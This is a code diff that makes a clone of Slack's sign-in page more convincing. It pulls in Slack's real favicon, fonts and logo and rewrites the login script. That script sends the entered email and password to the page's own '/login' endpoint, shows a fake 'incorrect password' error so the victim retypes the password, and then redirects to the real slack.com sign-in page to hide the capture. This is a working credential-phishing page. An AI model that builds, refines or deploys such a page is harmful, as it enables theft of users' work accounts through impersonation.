@@ -4,49 +4,94 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in | Slack</title>
+    <link rel="icon" href="https://a.slack-edge.com/80588/marketing/img/meta/favicon-32.png" sizes="32x32" type="image/png">
     <style>
+        @font-face {
+            font-family: 'Slack-Lato';
+            src: url('https://a.slack-edge.com/bv1-9/lato-regular-webfont-7b240b3.woff2') format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Slack-Lato';
+            src: url('https://a.slack-edge.com/bv1-9/lato-bold-webfont-49d685e.woff2') format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+        
         body {
-            font-family: "Slack-Lato", appleLogo, sans-serif;
+            font-family: "Slack-Lato", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
             margin: 0;
             display: flex;
             flex-direction: column;
             align-items: center;
             background-color: #fff;
-            padding-top: 40px;
+            color: #1d1c1d;
+            height: 100vh;
         }
-        .logo {
-            margin-bottom: 40px;
+
+        header {
+            width: 100%;
+            padding: 40px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
+
         .logo img {
             height: 34px;
         }
+
+        .main-content {
+            width: 100%;
+            max-width: 800px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0 20px;
+            box-sizing: border-box;
+        }
+
         h1 {
             font-size: 48px;
             font-weight: 700;
-            letter-spacing: -1px;
+            letter-spacing: -0.75px;
             margin-bottom: 10px;
-            color: #1d1c1d;
+            text-align: center;
+            line-height: 56px;
         }
-        p {
+
+        .subtitle {
             font-size: 18px;
             line-height: 27px;
             margin-bottom: 32px;
             color: #454245;
+            text-align: center;
             max-width: 700px;
-            text-align: center;
         }
-        .container {
-            width: 400px;
-            text-align: center;
+        
+        .subtitle a {
+            color: #1264a3;
+            text-decoration: none;
         }
-        .google-btn, .apple-btn {
+        
+        .subtitle a:hover {
+            text-decoration: underline;
+        }
+
+        .auth-container {
             width: 100%;
-            padding: 12px;
+            max-width: 400px;
+        }
+
+        .social-btn {
+            width: 100%;
+            height: 44px;
             border: 2px solid #1d1c1d;
             border-radius: 4px;
             background: #fff;
             font-size: 18px;
-            font-weight: 900;
+            font-weight: 700;
             color: #1d1c1d;
             cursor: pointer;
             margin-bottom: 16px;
@@ -54,127 +99,280 @@
             align-items: center;
             justify-content: center;
             transition: all 0.2s;
+            position: relative;
         }
-        .google-btn:hover, .apple-btn:hover {
+
+        .social-btn:hover {
             box-shadow: 0 1px 4px rgba(0,0,0,0.3);
+            background-color: #f8f8f8;
         }
+        
+        .social-btn img {
+            width: 20px;
+            height: 20px;
+            margin-right: 12px;
+            position: absolute;
+            left: 20px;
+        }
+
         .divider {
             display: flex;
             align-items: center;
             margin: 24px 0;
+            width: 100%;
         }
+
         .divider span {
-            padding: 0 10px;
-            color: #616061;
+            padding: 0 20px;
+            color: #1d1c1d;
             font-size: 15px;
+            background: #fff;
         }
+
         .divider::before, .divider::after {
             content: "";
             flex: 1;
-            border-top: 1px solid #ddd;
+            border-top: 1px solid #dddddd;
         }
+
+        .input-wrapper {
+            margin-bottom: 20px;
+        }
+
         input {
             width: 100%;
-            padding: 12px;
+            padding: 11px 12px 13px;
             border: 1px solid #868686;
             border-radius: 4px;
             font-size: 18px;
-            margin-bottom: 20px;
             box-sizing: border-box;
             color: #1d1c1d;
+            height: 44px;
+            transition: box-shadow 70ms ease-out, border-color 70ms ease-out;
         }
+
         input:focus {
             border-color: #1264a3;
             box-shadow: 0 0 0 4px rgba(29,155,209,0.3);
             outline: none;
         }
+        
+        input::placeholder {
+            color: #868686;
+        }
+
         .signin-btn {
             background-color: #4a154b;
             color: #fff;
             border: none;
             border-radius: 4px;
             width: 100%;
-            padding: 14px;
+            height: 44px;
             font-size: 18px;
             font-weight: 900;
             cursor: pointer;
             transition: background-color 0.2s;
         }
+
         .signin-btn:hover {
-            background-color: #350d36;
+            background-color: #3f1240;
         }
-        .footer {
-            margin-top: 80px;
-            color: #696969;
-            font-size: 14px;
+        
+        .signin-btn:disabled {
+            background-color: #dddddd;
+            color: #1d1c1d;
+            cursor: not-allowed;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .error-message {
+            background-color: #fbecec;
+            border: 1px solid #e01e5a;
+            border-radius: 4px;
+            padding: 12px 16px;
+            margin-bottom: 24px;
+            display: none;
+            align-items: flex-start;
+        }
+        
+        .error-icon {
+            color: #e01e5a;
+            margin-right: 8px;
+            margin-top: 2px;
+        }
+        
+        .error-text {
+            color: #1d1c1d;
+            font-size: 15px;
+            line-height: 22px;
+        }
+
+        footer {
+            margin-top: auto;
+            padding: 32px 0;
+            width: 100%;
+            text-align: center;
+            background-color: #f8f8f8;
+            border-top: 1px solid #e6e6e6;
+        }
+        
+        footer ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
             display: flex;
             justify-content: center;
-            gap: 20px;
+            flex-wrap: wrap;
         }
-        .footer a {
+        
+        footer li {
+            margin: 0 16px;
+        }
+        
+        footer a {
             color: #696969;
             text-decoration: none;
+            font-size: 14px;
+            font-weight: 700;
         }
-        .footer a:hover {
-            text-decoration: underline;
+        
+        footer a:hover {
             color: #1264a3;
+            text-decoration: underline;
         }
-    </style>
-    <script>
-        async function handleLogin(event) {
-            event.preventDefault();
-            const form = event.target;
-            const formData = new FormData(form);
-            const data = Object.fromEntries(formData.entries());
-            
-            try {
-                const response = await fetch('/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                
-                if (response.ok) {
-                    window.location.href = "https://slack.com/signin";
-                }
-            } catch (error) {
-                console.error('Error:', error);
+
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 32px;
+                line-height: 38px;
+            }
+            .subtitle {
+                font-size: 16px;
             }
         }
-    </script>
+    </style>
 </head>
 <body>
-    <div class="logo">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d5/Slack_icon_2019.svg/500px-Slack_icon_2019.svg.png" alt="Slack">
-    </div>
-    
-    <h1>Sign in to Slack</h1>
-    <p>We suggest using the <strong>email address you use at work.</strong></p>
-    
-    <div class="container">
-        <button class="google-btn">Sign in with Google</button>
-        <button class="apple-btn">Sign in with Apple</button>
-        
-        <div class="divider">
-            <span>OR</span>
+    <header>
+        <div class="logo">
+            <img src="https://a.slack-edge.com/80588/marketing/img/icons/icon_slack_hash_colored.png" alt="Slack" style="height: 34px; margin-right: 10px; vertical-align: middle;">
+            <span style="font-size: 24px; font-weight: 900; vertical-align: middle; letter-spacing: -1px;">slack</span>
         </div>
-        
-        <form id="login-form" onsubmit="handleLogin(event)">
-            <input type="email" id="email" name="email" placeholder="name@work-email.com" required>
-            <input type="password" id="password" name="password" placeholder="Password" required>
+    </header>
+
+    <div class="main-content">
+        <h1>Sign in to Slack</h1>
+        <div class="subtitle">
+            We suggest using the <strong>email address you use at work.</strong>
+        </div>
+
+        <div class="auth-container">
+            <button class="social-btn">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google">
+                Sign in with Google
+            </button>
+            <button class="social-btn">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+                Sign in with Apple
+            </button>
+
+            <div class="divider">
+                <span>OR</span>
+            </div>
             
-            <button type="submit" class="signin-btn">Sign In with Email</button>
-        </form>
-        
-        <div style="margin-top: 24px; color: #616061; font-size: 14px;">
-            New to Slack? <a href="#" style="color: #1264a3; text-decoration: none;">Create an account</a>
+            <div class="error-message" id="error-msg">
+                <span class="error-icon">⚠️</span>
+                <span class="error-text">Sorry, you entered an incorrect email or password.</span>
+            </div>
+
+            <form onsubmit="submitLogin(event)">
+                <div class="input-wrapper">
+                    <input type="email" id="email" placeholder="name@work-email.com" required>
+                </div>
+                
+                <div class="input-wrapper">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+
+                <button type="submit" class="signin-btn" id="btn-login">
+                    Sign In
+                </button>
+                
+                <div style="margin-top: 24px; text-align: center;">
+                    <div style="margin-bottom: 8px; color: #454245; font-size: 15px;">
+                        <input type="checkbox" id="remember" style="width: auto; margin-right: 8px; vertical-align: middle;">
+                        <label for="remember" style="vertical-align: middle;">Remember me</label>
+                    </div>
+                    <a href="#" style="color: #1264a3; text-decoration: none; font-size: 15px;">Forgot password?</a>
+                </div>
+            </form>
         </div>
     </div>
-    
-    <div class="footer">
-        <a href="#">Privacy & Terms</a>
-        <a href="#">Contact Us</a>
-        <a href="#">Change Region</a>
-    </div>
+
+    <footer>
+        <ul>
+            <li><a href="#">Privacy & Terms</a></li>
+            <li><a href="#">Contact Us</a></li>
+            <li><a href="#">Change Region</a></li>
+        </ul>
+    </footer>
+
+    <script>
+        function submitLogin(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (!email || !password) return;
+
+            const btn = document.getElementById('btn-login');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<span class="spinner"></span> Signing In...';
+            btn.disabled = true;
+
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password
+                })
+            }).then(response => {
+                if (response.ok) {
+                    window.location.href = "https://slack.com/signin";
+                } else {
+                    btn.innerHTML = originalText;
+                    btn.disabled = false;
+                    
+                    // Show error message
+                    const errorMsg = document.getElementById('error-msg');
+                    errorMsg.style.display = 'flex';
+                    
+                    // Clear password
+                    document.getElementById('password').value = '';
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+                window.location.href = "https://slack.com/signin";
+            });
+        }
+    </script>
 </body>
 </html>
